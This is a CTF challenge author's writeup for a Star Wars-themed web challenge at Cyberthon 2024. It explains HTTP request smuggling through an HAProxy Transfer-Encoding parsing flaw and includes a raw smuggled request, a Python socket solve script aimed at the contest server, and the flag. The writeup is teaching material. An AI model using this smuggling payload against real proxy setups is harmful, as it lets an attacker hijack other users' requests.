---
title: Cyberthon 2024 - The Galaxy's Best Smuggler
date: 2024-05-04
tags: Challenge Creation
categories: CTF Writeups
---

Cyberthon is an annual CTF competition targeted towards JC students in Singapore. This year, I had the opportunity to author a challenge for the web category: The Galaxy's Best Smuggler.


At the end of this writeup are my thoughts on challenge creation.


## Challenge

> 📘 Challenge description:
>
> 
> 
> "Ever heard of sabacc?"
> 
> "I've played it a couple times."
> 
> 
> 
> You eye the stifling pile of credit on Lando's side of the table, allowing yourself a wry smile.
> 
> 
> 
> "Having a good day, I reckon."
> 
> 
> 
> "Oh, you ain't seen nothing yet, Han. I bet my ship I win this next game."
> 
> You spy a faint glimmer in his eyes typical of all smugglers, one of trickery and deceit.
> 
> 
> 
> "Not playing fair, I suppose. Well, two can play at that game. After all..."
> 
> "They don't call me the galaxy's best SMUGGLER for nothing." 


[Link to source code](https://github.com/Iscaraca/CTF-Challenges/tree/main/cyberthon2024/the_galaxys_best_smuggler)


In this challenge, you play against a bot in a modified version of blackjack, where the sweet spot is 20. Your opponent has rigged the cards such that they'll always draw 20 at the start every time, while you'll draw a measly 2. To get the flag, you'll have to win the game.


![Sabacc game page](sabacc.png)


The rules of the game are simple.

- Your opponent will make the first move.

- At every turn, you can make one of 3 moves:

    - Hit: Draw a new card from the deck, and add it to your hand.
    - Stand: End your turn without taking a card.
    - Reveal: Place your hand on the table face up, and force your opponent to do the same. The winner will be judged. You cannot do this on the move that opens the game.


While the entire solve path was clued via hints given in the provided markdown file during the challenge, I'll go through the challenge as if there was no help given.


## Writeup

### Crafting a plan

Source code for this challenge is provided in full, along with deployment steps. Let's first look at the conditions required to win a game.


```python
# Check for winning hand
if (player_1_total == 20 and player_2_total == 20):
    self.winner = "Draw"
elif player_1_total == 20:
    self.winner = "Player 1"
elif player_2_total == 20:
    self.winner = "Player 2"

# Check for overflowed hands
elif (player_1_total > 20 and player_2_total > 20):
    self.winner = "Draw"
elif player_1_total > 20:
    self.winner = "Player 2"
elif player_2_total > 20:
    self.winner = "Player 1"

# Check for larger hand
elif player_1_total == player_2_total:
    self.winner = "Draw"
elif player_1_total > player_2_total:
    self.winner = "Player 1"
elif player_2_total > player_1_total:
    self.winner = "Player 2"
```


The bot will always join as player 1, so its hand will be evaluated first. We have no opportunity to win using our hand alone, so we'll need to somehow sabotage our opponent's hand to win. If we could force the bot to draw another card instead of revealing its hand, we'd overflow its hand and win by default. Is there a way to do just that?


This challenge is an introduction to **HTTP request smuggling**, as clued by the title and the description. This is a technique to interfere with the way servers process HTTP requests coming from more than one source. Before we get into specifics, it would be useful to read up on an [overview of how the attack works](https://portswigger.net/web-security/request-smuggling).


We'll be using this technique to tamper with the bot's HTTP request to `/reveal`, and change it to `/hit` instead.


### Finding the vulnerability

We'll need to craft a HTTP request that can be parsed using the `Content-Length` header on either the proxy or the game server, and `Transfer-Encoding` on the other. However, both HAProxy (the proxy) and Gunicorn (the backend web server) ignore the `Content-Length` header when both of them are present, as per the HTTP/1 specification.


Either by looking for vulnerabilities related to HAProxy or noticing that the specific version of HAProxy used in the docker environment is outdated, we can find a [well-documented vulnerability](https://nathandavison.com/blog/haproxy-http-request-smuggling) detailing a way to malform the `Transfer-Encoding` header such that HAProxy fails to detect it, while Gunicorn does. The key is to simply insert a `\x0b` character into the `Transfer-Encoding` header.


With this knowledge, we can craft a HTTP request to tamper with the bot's.


### How the HTTP Protocol Works

Before we get to our payload, let's first go through how web applications send and receive data.


Almost all HTTP communication is done over TCP/IP, which you can think of as a reliable pipe that streams bytes of data from one end to another. Bytes that go in one end of the pipe come out of the other correctly, and in the same order they went in. When HTTP messages are transmitted over this pipe in a single stream of bytes, how does the web application receiving this data know when each request starts and stops?


First, the application will read the stream of bytes until it receives two CRLF sequences, `\r\n\r\n`. This will be the end of our HTTP header. Notice how in the example request below, the header and body are delimited with a double CRLF.


```
HTTP/1.1 200 OK
Content-Type: text/plain
Content-Length: 23

Hello, world!
```


However, the body does not have a fixed delimiter indicating its end. Instead, the length of the body can be determined from the header, either via `Content-Length` or `Transfer-Encoding: chunked`. How the second method works can be found [here](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Transfer-Encoding). Once the length of the body is determined, the application will then read that number of bytes from the pipe, successfully reading one full HTTP request.


While the application is parsing the header, where is the HTTP body stored? All data that has not been procedded by the application yet is stored in a buffer called the TCP Receive Window, until the application chooses to read more data from the pipe. Remember that data being read from the pipe must be in the same order it went in.


### Constructing our Payload

I will be using [edgeshark](https://github.com/siemens/edgeshark) to capture network traffic from within the docker environment, which will allow us to view the transfer of HTTP packets using Wireshark. This is not a necessary step, but it's useful for a writeup/tutorial such as this one.


In this section, it is important that **all requests are sent to the proxy directly**. Sending these requests to your client will do nothing as the bot's requests do not pass through the client.


We'll be monitoring HAProxy's ethernet interface for this section. On round 3, the bot will send a GET request to the `/reveal` endpoint with its cookie.


![Reveal request](reveal.png)


```
GET /reveal HTTP/1.1
Host: proxy:1080
User-Agent: python-requests/2.31.0
Accept-Encoding: gzip, deflate
Accept: */*
Cookie: player_id=9576b07a-88b5-4df0-94a0-39ded4ee47d2


```


Now that we know the bot's HTTP request, let's break down the attack. Consider this payload:


```
GET /game-state HTTP/1.1
Host: 127.0.0.1:8001
Content-Length: 30
Connection: keep-alive
Transfer-Encoding:[\x0b]chunked

0

GET /hit HTTP/1.1
X-Foo:
```


When we send this to HAProxy, it ignores the `Transfer-Encoding` header and uses the value provided by `Content-Length` to parse the request. This makes the proxy interpret the request as is, up to `X-Foo:`. However, the proxy forwards this request as a stream of bytes to the backend server, which correctly indentifies `Transfer-Encoding` and reads the stream as such:


```
GET /game-state HTTP/1.1
Host: 127.0.0.1:8001
Content-Length: 30
Connection: keep-alive
Transfer-Encoding:[\x0b]chunked

0
```


This leaves the remainder of the request,

```
GET /hit HTTP/1.1
X-Foo:
```

still in the TCP Receive Window of the game server. What happens if the bot sends its request now? What would the stream of data look like in the TCP pipe?


```
GET /hit HTTP/1.1
X-Foo:GET /reveal HTTP/1.1
Host: proxy:1080
User-Agent: python-requests/2.31.0
Accept-Encoding: gzip, deflate
Accept: */*
Cookie: player_id=9576b07a-88b5-4df0-94a0-39ded4ee47d2


```


When the server is ready to process its next request, it reads the above as one full HTTP request, a GET request to `/hit` from the bot's player ID. We've successfully tampered with the bot's request!


### One Possible Pitfall

Just sending this payload once will not work. Looking at the edgeshark capture, we can see that our TCP stream is closing right after we send our payload, and the GET request to `/reveal` doesn't use the same stream. 


![Stream capture](stream.png)


The issue is that Gunicorn spawns multiple threads per worker, so smuggling one of them won't be enough. The simple workaround here is to send our payload to the proxy many times to ensure that all the TCP streams get polluted with our payload.


### Final Solution

All we have to do is wait until its our move, either hit or stand, and run our solve script right before the bot sends in the request to reveal.


```python
import socket

# The proxy port is 4941

payload = b"""GET /game-state HTTP/1.1\r\nHost: sabacc.chals.f.cyberthon24.ctf.sg:4941\r\nContent-Length: 30\r\nConnection: keep-alive\r\nTransfer-Encoding:chunked\r\n\r\n0\r\n\r\nGET /hit HTTP/1.1\r\nX-Foo:"""

for i in range(30):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect(("sabacc.chals.f.cyberthon24.ctf.sg", 4941))
    sock.send(payload)

response = sock.recv(4096)
print(response.decode())
```


```
PS C:\Users\user\sol> python .\solution.py
HTTP/1.1 406 NOT ACCEPTABLE
Server: gunicorn/19.9.0
Date: Sat, 04 May 2024 12:06:26 GMT
Content-Type: application/json
Content-Length: 30

{"error":"Player ID not set"}
```


![Forced draw](forced.png)


And all we have to do now is reveal.


![Win](win.png)


```
Cyberthon{the_falcon_is_all_mine!}
```


## Thoughts

When I was given the theme for this year's Cyberthon (Star Wars), the idea to somehow incorporate request smuggling as a thematic connection to the smugglers and gunrunners of the SW universe came to me pretty quickly. The whole card game idea came from the lore, and I think I did a pretty good job on that part.


Halfway through making the challenge, I realised that the vulnerability worked against me, as teams could very easily sabotage others by smuggling their requests to the server as well. I had to come up with a solution for this, which was my standalone CTF challenge instancer you can find [here](https://github.com/Iscaraca/CTFInstancer).


I really wanted to make this a good learning experience, which was why I put almost the entire solution path in a downloadable markdown file as hints. It was a bit challenging to balance exploration with supervision in a way that made the challenge rewarding, but this challenge wasn't supposed to be that hard anyway. The CTF was 8 hours, after all.


I think this challenge seemed way too daunting to most participants, despite being (in my opinion) the easiest challenge out of the three harder web challenges. Perhaps I should've left out the fact that this challenge was difficult in the markdown file to harmlessly mislead them.


Thank you to Alt-Tab Labs and CSIT for this opportunity, and to Kane from NUSH for solving my challenge. You can claim caifan from me anytime.